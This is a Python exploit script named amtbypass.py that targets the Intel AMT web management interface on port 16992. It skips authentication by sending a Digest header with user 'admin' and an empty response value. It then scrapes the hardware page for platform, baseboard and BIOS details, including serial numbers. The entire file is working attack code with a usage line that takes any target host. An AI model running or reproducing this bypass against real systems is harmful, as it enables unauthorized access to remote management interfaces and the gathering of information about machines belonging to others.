#!/usr/bin/env python

import requests
import re
import sys
import pprint
from lxml import html

def getAuthHeader(target, source=None):
    if not source or not 'WWW-Authenticate' in source.headers['WWW-Authenticate']:
        source = requests.get("http://{0}:16992/index.htm".format(target))

    # Get digest and nonce and return the new header
    if 'WWW-Authenticate' in source.headers:
        data = re.compile('Digest realm="Digest:(.*)", nonce="(.*)",stale="false",qop="auth"').search(source.headers['WWW-Authenticate'])
        digest = data.group(1)
        nonce = data.group(2)
        return 'Digest username="admin", realm="Digest:{0}", nonce="{1}", uri="/index.htm", response="", qop=auth, nc=00000001, cnonce="deadbeef"'.format(digest, nonce)
    return None

def getRawData(target, page):
    return requests.get("http://{0}:16992/{1}.htm".format(target, page), headers={'Authorization': getAuthHeader(target)})

def getHardwareInfos(target):
    req = getRawData(target, 'hw-sys')
    if not req.status_code == 200:
        return None
    tree = html.fromstring(req.content)
    raw = tree.xpath('//td[@class="r1"]/text()')
    bios_functions = tree.xpath('//td[@class="r1"]/table//td/text()')
    data = {
        'platform': {
            'model': raw[0],
            'manufacturer': raw[1],
            'version': raw[2],
            'serial': raw[4],
            'system_id': raw[5]
        },
        'baseboard': {
            'manufacturer': raw[6],
            'name': raw[7],
            'version': raw[8],
            'serial': raw[9],
            'tag': raw[10],
            'replaceable': raw[11]
        },
        'bios': {
            'vendor': raw[12],
            'version': raw[13],
            'date': raw[14],
            'functions': bios_functions
        }
    }
    return data

if not len(sys.argv) == 2:
    print("USAGE: amtbypass.py <target>")
else:
    pprint.pprint(getHardwareInfos(sys.argv[1]))
